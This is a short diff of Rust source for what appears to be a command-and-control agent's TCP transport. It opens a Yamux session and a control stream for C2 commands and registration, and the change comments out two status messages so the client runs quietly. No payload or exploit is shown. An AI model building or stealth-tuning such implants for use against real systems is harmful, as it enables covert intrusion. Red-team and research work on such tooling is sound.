@@ -121,7 +121,7 @@ impl Transport for TcpTransport {
                     
                     // Create Yamux connection in Client mode
                     let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
-                    println!("[*] Yamux Session created.");
+                    // println!("[*] Yamux Session created.");
                     let mut control = connection.control();
 
                     // Open the control stream (first stream for C2 commands)
@@ -181,7 +181,7 @@ impl Transport for TcpTransport {
 
                     let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
                         Ok(Ok(s)) => {
-                            println!("[+] Control Stream Opened. Sending registration...");
+                            // println!("[+] Control Stream Opened. Sending registration...");
                             s
                         }
                         Ok(Err(e)) => {
